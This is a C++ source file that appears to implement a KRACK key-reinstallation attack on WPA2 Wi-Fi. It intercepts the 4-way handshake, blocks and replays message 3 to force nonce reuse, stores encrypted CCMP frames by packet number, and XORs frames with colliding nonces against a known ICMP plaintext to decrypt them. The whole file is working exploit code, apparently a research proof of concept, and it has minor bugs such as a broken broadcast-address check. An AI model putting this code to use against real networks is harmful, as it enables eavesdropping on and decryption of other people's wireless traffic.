#include <iostream>
#include <stdint.h>

#include "util.h"
#include "osal_wi.h"
#include "KrackState.h"
#include "ClientInfo.h"


int KrackState::replay_msg3(wi_dev *dev)
{
	if (!msg3_buf.empty())
	{
		printf("\n##########\nReplay Msg3\n##########\n");
		raw_ieee80211pkt raw_pkt = msg3_buf[0];
		num_coll_pkts = 0;
		if (osal_wi_write(dev, raw_pkt.buf, raw_pkt.plen) < 0)
			return -1;
		return 0;
	}
	return -1;
}

void KrackState::save_ccmp_pkt(ccmp_pkt* pkt)
{
	ccmp_pkt_lines[curr_line].push_back(*pkt);
	if (pkt->nonce.pn > last_pn)
		last_pn = pkt->nonce.pn;
}

int KrackState::decrypt_pkts()
{
	int k = 1;
	int i = 0;
	// For testing we only check line 0 and 1
	for (auto pkt_a = ccmp_pkt_lines[i].begin(); pkt_a != ccmp_pkt_lines[i].end(); ++pkt_a)
	{
		for (auto pkt_b = ccmp_pkt_lines[k].begin(); pkt_b != ccmp_pkt_lines[k].end(); ++pkt_b)
		{
			if (pkt_a->nonce.pn == pkt_b->nonce.pn)
			{
				ccmp_xored_pkt xp;
				xp.pn = pkt_a->nonce.pn;
				memcpy(xp.data, pkt_a->data, pkt_a->len);
				for (int j=0; j < pkt_b->len; ++j)
					xp.data[j] ^= pkt_b->data[j];

				std::cout << "Xored packets with PN: " << xp.pn << std::endl;
				dump_packet(xp.data, sizeof(xp.data));
				for (int j=0; j < sizeof(icmp_pkt); ++j)
					xp.data[j] ^= icmp_pkt[j];
				std::cout << "Decrypted packet with PN: " << xp.pn << std::endl;
				dump_packet(xp.data, sizeof(xp.data));
			}
		}
	}
	ccmp_pkt_lines[i].clear();
	ccmp_pkt_lines[k].clear();
	return 0;
}

int KrackState::handle_packet(uint8_t *buf, size_t plen)
{

	//
	// Check for EAPOL frame and forward/block
	//

	eapol_update eapol = check_eapol_handshake(&client->keys, buf, plen);
	if (eapol.framenum)
	{
		// Forward Msg 1 and 2
		if (eapol.framenum < 3)
		{
			if (eapol.framenum == 1) state = MSG1_RCVD;
			else if (eapol.framenum == 2) state = MSG2_RCVD;
	
			return plen;
		}
		else if (eapol.framenum == 3)
		{
			/** If it isn't the first Msg3. Block and backup Msg3 */
			if (state >= MSG3_RCVD) 
			{
				std::cout << "\nbackup msg3 " << std::endl;
				state = MSG3_RCVD;
				save_eapol_msg(buf, plen, &eapol);
				return 0;
			}
			std::cout << "\nforward msg3 " << std::endl;
			state = MSG3_FWD;
			// Select new packet line for encrypted packets
			curr_line = (curr_line + 1) % PKT_LINES;
			return plen;
		}
		else if(eapol.framenum == 4)
		{
			save_eapol_msg(buf, plen, &eapol);
			if (msg3_buf.size() >= 2)
			{
				std::cout << "\nCaptured at least 2 Msg3" << std::endl;
				state = MSG4_FWD;
				return plen;
			}
			return 0;
		}
	}

	//
	// Save data packets and forward/block them
	//
	
	ieee80211header *hdr = (ieee80211header*) buf;
	if (hdr->addr1 == (uint8_t*) "\xff\xff\xff\xff\xff\xff")
		return plen; // We are not interested in broadcast traffic
	
	size_t pos = 0;
	if (hdr->fc.type == TYPE_DATA && hdr->fc.protectedframe)
	{	
		ccmp_nonce nonce;
		parse_ccmp_nonce(buf, plen, &nonce);

		if (nonce.pn <= last_pn)
			std::cout << "\nKey has been sucessfully reinstalled!" << std::endl;
		else if (state >= MSG3_RCVD)
			std::cout << "\nNonce still incrementing" << std::endl;
		std::cout << "\nnum_coll_pkts = " << num_coll_pkts << std::endl;

		pos = sizeof(ieee80211header);
		if (hdr->fc.subtype >= 8 && hdr->fc.subtype <= 11) {
			pos += sizeof(ieee80211qosheader);
		}
		pos += sizeof(ccmp_hdr);	

		ccmp_pkt pkt;

		memcpy(&pkt.nonce, &nonce, sizeof(ccmp_nonce));
		memcpy(pkt.data, buf, plen);
		pkt.len = plen;
		ccmp_pkt_lines[curr_line].push_back(pkt);
		++num_coll_pkts;

		std::cout << "\nstored encrypted packet. Nonce: " << pkt.nonce.pn << std::endl;
		//dump_packet(pkt.data, pkt.len);

		// Testing only. Block packet
		return 0;

	}
	return plen;
}

int KrackState::save_eapol_msg(uint8_t *buf, size_t plen, eapol_update *eapol)
{
	/* We do not save Msg1 and Msg2 */
	if (eapol->framenum == 1 || eapol->framenum == 2)
		return eapol->framenum;

	if (eapol->framenum == 3)
	{
		state = MSG3_RCVD;
		raw_ieee80211pkt pkt;
		memcpy(pkt.buf, buf, plen);
		pkt.plen = plen;
		msg3_buf.push_back(pkt);
		return 3;
	}
	else if (eapol->framenum == 4)
	{
		state = MSG4_RCVD;
		raw_ieee80211pkt pkt;
		memcpy(pkt.buf, buf, plen);
		pkt.plen = plen;
		msg4_buf.push_back(pkt);
		return 4;
	}

	return -1;
}
